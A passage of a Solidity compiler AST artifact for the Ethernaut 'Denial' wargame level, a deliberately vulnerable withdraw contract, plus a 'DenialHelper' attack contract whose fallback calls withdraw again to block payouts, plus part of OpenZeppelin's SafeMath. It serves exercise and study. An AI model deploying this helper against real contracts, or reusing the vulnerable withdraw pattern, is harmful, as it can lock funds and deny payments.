																"src": "892:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "873:32:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 49,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "873:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 50,
												"nodeType": "ExpressionStatement",
												"src": "873:36:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 54,
															"name": "amountToSend",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 33,
															"src": "935:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 51,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 13,
															"src": "920:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 53,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "920:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 55,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "920:28:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 56,
												"nodeType": "ExpressionStatement",
												"src": "920:28:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 59,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 57,
														"name": "timeLastWithdrawn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "1006:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 58,
														"name": "now",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": -17,
														"src": "1026:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1006:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 60,
												"nodeType": "ExpressionStatement",
												"src": "1006:23:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 70,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 61,
															"name": "withdrawPartnerBalances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 19,
															"src": "1040:23:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 63,
														"indexExpression": {
															"argumentTypes": null,
															"id": 62,
															"name": "partner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 7,
															"src": "1064:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "1040:32:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 68,
																"name": "amountToSend",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 33,
																"src": "1112:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 64,
																	"name": "withdrawPartnerBalances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 19,
																	"src": "1075:23:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 66,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 65,
																	"name": "partner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "1099:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "1075:32:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 67,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 146,
															"src": "1075:36:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 69,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1075:50:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1040:85:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 71,
												"nodeType": "ExpressionStatement",
												"src": "1040:85:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "3ccfd60b",
									"id": 73,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdraw",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "665:2:0"
									},
									"returnParameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "675:0:0"
									},
									"scope": 90,
									"src": "648:485:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 76,
										"nodeType": "Block",
										"src": "1199:2:0",
										"statements": []
									},
									"documentation": null,
									"id": 77,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 74,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1179:2:0"
									},
									"returnParameters": {
										"id": 75,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1199:0:0"
									},
									"scope": 90,
									"src": "1172:29:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 88,
										"nodeType": "Block",
										"src": "1292:47:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 84,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -28,
																"src": "1318:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Denial_$90",
																	"typeString": "contract Denial"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_Denial_$90",
																	"typeString": "contract Denial"
																}
															],
															"id": 83,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "1310:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": {
																"id": 82,
																"name": "address",
																"nodeType": "ElementaryTypeName",
																"src": "1310:7:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 85,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1310:13:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"id": 86,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "balance",
													"nodeType": "MemberAccess",
													"referencedDeclaration": null,
													"src": "1310:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 81,
												"id": 87,
												"nodeType": "Return",
												"src": "1303:28:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "8b7afe2e",
									"id": 89,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "contractBalance",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 78,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1262:2:0"
									},
									"returnParameters": {
										"id": 81,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 80,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 89,
												"src": "1286:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 79,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1286:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1285:6:0"
									},
									"scope": 90,
									"src": "1238:101:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 91,
							"src": "176:1166:0"
						}
					],
					"src": "33:1309:0"
				},
				"id": 0
			},
			"contracts/Ethernaut/DenialHelper.sol": {
				"ast": {
					"absolutePath": "contracts/Ethernaut/DenialHelper.sol",
					"exportedSymbols": {
						"DenialHelper": [
							117
						]
					},
					"id": 118,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 92,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:1"
						},
						{
							"absolutePath": "contracts/Ethernaut/Denial.sol",
							"file": "./Denial.sol",
							"id": 93,
							"nodeType": "ImportDirective",
							"scope": 118,
							"sourceUnit": 91,
							"src": "58:22:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 117,
							"linearizedBaseContracts": [
								117
							],
							"name": "DenialHelper",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 95,
									"mutability": "mutable",
									"name": "denialInst",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 117,
									"src": "113:17:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Denial_$90",
										"typeString": "contract Denial"
									},
									"typeName": {
										"contractScope": null,
										"id": 94,
										"name": "Denial",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 90,
										"src": "113:6:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Denial_$90",
											"typeString": "contract Denial"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 106,
										"nodeType": "Block",
										"src": "186:50:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 104,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 100,
														"name": "denialInst",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 95,
														"src": "197:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Denial_$90",
															"typeString": "contract Denial"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 102,
																"name": "denialAddr",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 97,
																"src": "217:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															],
															"id": 101,
															"name": "Denial",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 90,
															"src": "210:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_Denial_$90_$",
																"typeString": "type(contract Denial)"
															}
														},
														"id": 103,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "210:18:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Denial_$90",
															"typeString": "contract Denial"
														}
													},
													"src": "197:31:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Denial_$90",
														"typeString": "contract Denial"
													}
												},
												"id": 105,
												"nodeType": "ExpressionStatement",
												"src": "197:31:1"
											}
										]
									},
									"documentation": null,
									"id": 107,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 98,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 97,
												"mutability": "mutable",
												"name": "denialAddr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 107,
												"src": "151:26:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												},
												"typeName": {
													"id": 96,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "151:15:1",
													"stateMutability": "payable",
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "150:28:1"
									},
									"returnParameters": {
										"id": 99,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "186:0:1"
									},
									"scope": 117,
									"src": "139:97:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 115,
										"nodeType": "Block",
										"src": "272:40:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"argumentTypes": null,
															"id": 110,
															"name": "denialInst",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 95,
															"src": "283:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Denial_$90",
																"typeString": "contract Denial"
															}
														},
														"id": 112,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "withdraw",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 73,
														"src": "283:19:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
															"typeString": "function () external"
														}
													},
													"id": 113,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "283:21:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 114,
												"nodeType": "ExpressionStatement",
												"src": "283:21:1"
											}
										]
									},
									"documentation": null,
									"id": 116,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 108,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "252:2:1"
									},
									"returnParameters": {
										"id": 109,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "272:0:1"
									},
									"scope": 117,
									"src": "244:68:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 118,
							"src": "84:231:1"
						}
					],
					"src": "33:282:1"
				},
				"id": 1
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol": {
				"ast": {
					"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							313
						]
					},
					"id": 314,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 119,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:2"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 120,
								"nodeType": "StructuredDocumentation",
								"src": "58:563:2",
								"text": " @dev Wrappers over Solidity's arithmetic operations with added overflow\n checks.\n Arithmetic operations in Solidity wrap on overflow. This can easily result\n in bugs, because programmers usually assume that an overflow raises an\n error, which is the standard behavior in high level programming languages.\n `SafeMath` restores this intuition by reverting the transaction when an\n operation overflows.\n Using this library instead of the unchecked operations eliminates an entire\n class of bugs, so it's recommended to use it always."
							},
							"fullyImplemented": true,
							"id": 313,
							"linearizedBaseContracts": [
								313
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 145,
										"nodeType": "Block",
										"src": "941:109:2",
										"statements": [
											{
												"assignments": [
													131
												],
												"declarations": [
													{
														"constant": false,
														"id": 131,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 145,
														"src": "951:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 130,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "951:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 135,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 134,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 132,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 123,
														"src": "963:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 133,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 125,
														"src": "967:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "963:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "951:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 139,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 137,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 131,
																"src": "986:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 138,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 123,
																"src": "991:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "986:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206164646974696f6e206f766572666c6f77",
															"id": 140,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "994:29:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															},
															"value": "SafeMath: addition overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															}
														],
														"id": 136,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "978:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 141,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "978:46:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 142,
												"nodeType": "ExpressionStatement",
												"src": "978:46:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 143,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 131,
													"src": "1042:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 129,
												"id": 144,
												"nodeType": "Return",
												"src": "1035:8:2"
											}
										]
									},
									"documentation": {
										"id": 121,
										"nodeType": "StructuredDocumentation",
										"src": "645:224:2",
										"text": " @dev Returns the addition of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `+` operator.\n Requirements:\n - Addition cannot overflow."
									},
									"id": 146,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 126,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 123,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 146,
												"src": "887:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 122,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "887:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 125,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 146,
												"src": "898:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 124,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "898:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "886:22:2"
									},
									"returnParameters": {
										"id": 129,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 128,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 146,
												"src": "932:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 127,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "932:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "931:9:2"
									},
									"scope": 313,
									"src": "874:176:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 162,
										"nodeType": "Block",
										"src": "1388:67:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 157,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 149,
															"src": "1409:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 158,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 151,
															"src": "1412:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a207375627472616374696f6e206f766572666c6f77",
															"id": 159,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1415:32:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															},
															"value": "SafeMath: subtraction overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															}
														],
														"id": 156,
														"name": "sub",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															163,
															191
														],
														"referencedDeclaration": 191,
														"src": "1405:3:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 160,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1405:43:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 155,
												"id": 161,
												"nodeType": "Return",
												"src": "1398:50:2"
											}
										]
									},
									"documentation": {
										"id": 147,
										"nodeType": "StructuredDocumentation",
										"src": "1056:260:2",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 163,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 152,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 149,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 163,
												"src": "1334:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 148,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1334:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 151,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 163,
												"src": "1345:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 150,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1345:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
